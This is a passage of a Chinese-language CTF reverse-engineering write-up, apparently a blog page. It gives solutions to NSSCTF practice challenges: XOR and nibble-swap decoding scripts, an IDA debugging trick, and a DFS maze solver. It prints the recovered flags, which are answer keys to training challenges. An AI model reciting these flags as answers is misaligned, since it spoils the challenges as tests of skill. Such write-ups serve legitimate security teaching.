punctuation">,</span>  <span class="token number">971</span><span class="token punctuation">,</span>  <span class="token number">977</span><span class="token punctuation">,</span>  <span class="token number">973</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    char<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">900</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0x34</span><span class="token punctuation">)</span>    flag<span class="token operator">+=</span>char<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token comment">#NSSCTF&#123;x0r_1s_s0_easy&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="bjdctf-2020easy"><a class="markdownIt-Anchor" href="#bjdctf-2020easy"></a> [BJDCTF 2020]Easy</h2><h3 id="题目描述-21"><a class="markdownIt-Anchor" href="#题目描述-21"></a> 题目描述</h3><p>ida pro动态调试，发现_ques函数是输出flag的函数，劫持输出流，设置eip到该函数的入口，直接F9</p><p>看命令行界面（要熟练使用ida调试的快捷键）</p><h3 id="exp-21"><a class="markdownIt-Anchor" href="#exp-21"></a> exp</h3><p><img src="https://s2.loli.net/2024/02/15/x7otvYMFhyQHuk8.png" alt="" / loading="lazy"></p><p>HACKIT4FUN</p><h2 id="hgame-2022-week1easyasm"><a class="markdownIt-Anchor" href="#hgame-2022-week1easyasm"></a> [HGAME 2022 week1]easyasm</h2><h3 id="题目描述-22"><a class="markdownIt-Anchor" href="#题目描述-22"></a> 题目描述</h3><ul><li>解题大致思路<br />16位DOS，只能看汇编<br /><img src="https://www.nssctf.cn/files/2024/1/20/32b01217c6.jpg" alt="NSSIMAGE" / loading="lazy"><br />开头载入了两个数据dseg、seg001<br />往上翻可以找到<br />一个是提示字符<br /><img src="https://www.nssctf.cn/files/2024/1/20/3d75f449b8.jpg" alt="NSSIMAGE" / loading="lazy"><br />一个是密文<br /><img src="https://www.nssctf.cn/files/2024/1/20/8fc0b43fa8.jpg" alt="NSSIMAGE" / loading="lazy"><br />分析一下加密过程<br /><img src="https://www.nssctf.cn/files/2024/1/20/f1438d3800.jpg" alt="NSSIMAGE" / loading="lazy"><br />把每个数前四位和后四位交换，再与23异或<br />构建解密脚本（注意还原后的结果%256，不然打不出来正确的结果）</li></ul><h3 id="exp-22"><a class="markdownIt-Anchor" href="#exp-22"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#每个字节的前四位和后四位交换，再与23异或</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>Array<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">145</span><span class="token punctuation">,</span>  <span class="token number">97</span><span class="token punctuation">,</span>   <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span>  <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span>  <span class="token number">96</span><span class="token punctuation">,</span>  <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span>  <span class="token number">33</span><span class="token punctuation">,</span>    <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span>  <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span>  <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span>  <span class="token number">84</span><span class="token punctuation">,</span>  <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span>   <span class="token number">226</span><span class="token punctuation">,</span>  <span class="token number">96</span><span class="token punctuation">,</span>  <span class="token number">20</span><span class="token punctuation">,</span>  <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span>  <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span>  <span class="token number">23</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">b''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> Array<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    flag<span class="token operator">+=</span>long_to_bytes<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">^</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">^</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'hgame&#123;welc0me_to_4sm_w0rld&#125;\x00'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hubuctf-2022-新生赛help"><a class="markdownIt-Anchor" href="#hubuctf-2022-新生赛help"></a> [HUBUCTF 2022 新生赛]help</h2><h3 id="题目描述-23"><a class="markdownIt-Anchor" href="#题目描述-23"></a> 题目描述</h3><p>发现有个CreateMap()函数，在它后面的跳转点打个断点，动态调试<br /><img src="https://www.nssctf.cn/files/2023/11/5/521d2aa817.jpg" alt="NSSIMAGE" / loading="lazy"><br /><img src="https://www.nssctf.cn/files/2023/11/5/cf71784b99.jpg" alt="NSSIMAGE" / loading="lazy"><br />进入CreateMap()按F5找map<br /><img src="https://www.nssctf.cn/files/2023/11/5/8d3e5a1435.jpg" alt="NSSIMAGE" / loading="lazy"></p><p>在Export data 中提取出来，编辑成16个一行</p><pre class="line-numbers language-none"><code class="language-none是起点  wwdddwwwaaawwwwwwwwwddddssssdddssdsssssssdddwwwwddsssd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://www.nssctf.cn/files/2023/11/5/aac2e56d5f.jpg" alt="NSSIMAGE" / loading="lazy"><br />在check()函数可以发现步法，以及初始位置(1,15)<br />那么接下来就只需要找路了<br />找到之后转md5</p><h3 id="exp迷宫万用脚本dfs"><a class="markdownIt-Anchor" href="#exp迷宫万用脚本dfs"></a> exp(迷宫万用脚本dfs)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#可视化</span>dirs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment">#当前位置四个方向的偏移量</span>path<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>              <span class="token comment">#存找到的路径</span> <span class="token keyword">def</span> <span class="token function">mark</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#给迷宫maze的位置pos标"2"表示“倒过了”</span>    maze<span class="token punctuation">[</span>pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">def</span> <span class="token function">passable</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span> pos<span class="token punctuation">)</span><span class="token punctuation">:</span>    rows<span class="token punctuation">,</span> cols <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> rows <span class="token keyword">and</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> cols <span class="token keyword">and</span> maze<span class="token punctuation">[</span>pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">def</span> <span class="token function">find_path</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span>pos<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>    mark<span class="token punctuation">(</span>maze<span class="token punctuation">,</span>pos<span class="token punctuation">)</span>    <span class="token keyword">if</span> pos<span class="token operator">==</span>end<span class="token punctuation">:</span>        <span class="token comment"># print(pos,end=" ")  #已到达出口，输出这个位置。成功结束</span>        path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pos<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment">#否则按四个方向顺序检查</span>        nextp<span class="token operator">=</span>pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>dirs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>dirs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token comment">#考虑下一个可能方向</span>        <span class="token keyword">if</span> passable<span class="token punctuation">(</span>maze<span class="token punctuation">,</span>nextp<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#不可行的相邻位置不管</span>            <span class="token keyword">if</span> find_path<span class="token punctuation">(</span>maze<span class="token punctuation">,</span>nextp<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#如果从nextp可达出口，输出这个位置，成功结束</span>                <span class="token comment"># print(pos,end="")</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pos<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span> <span class="token keyword">def</span> <span class="token function">see_path</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token comment">#使寻找到的路径可视化</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        current_pos <span class="token operator">=</span> path<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>        next_pos <span class="token operator">=</span> path<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        direction <span class="token operator">=</span> <span class="token string">""</span>        <span class="token keyword">if</span> current_pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> next_pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            direction <span class="token operator">=</span> <span class="token string">"w"</span>  <span class="token comment"># 向下走</span>        <span class="token keyword">elif</span> current_pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> next_pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            direction <span class="token operator">=</span> <span class="token string">"s"</span>  <span class="token comment"># 向上走</span>        <span class="token keyword">elif</span> current_pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> next_pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            direction <span class="token operator">=</span> <span class="token string">"a"</span>  <span class="token comment"># 向右走</span>        <span class="token keyword">elif</span> current_pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> next_pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            direction <span class="token operator">=</span> <span class="token string">"d"</span>  <span class="token comment"># 向左走</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>direction<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span>p <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            maze<span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"E"</span>        <span class="token keyword">elif</span> i<span class="token operator">==</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            maze<span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"S"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            maze<span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token number">3</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> r <span class="token keyword">in</span> maze<span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> r<span class="token punctuation">:</span>            <span class="token keyword">if</span> c<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[0;31m'</span><span class="token operator">+</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> c<span class="token operator">==</span><span class="token string">"S"</span> <span class="token keyword">or</span> c<span class="token operator">==</span><span class="token string">"E"</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[0;34m'</span><span class="token operator">+</span>c<span class="token operator">+</span><span class="token string">" "</span> <span class="token operator">+</span> <span class="token string">'\033[0m'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> c<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[0;32m'</span><span class="token operator">+</span><span class="token string">"#"</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> c<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[0;;40m'</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    maze <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token 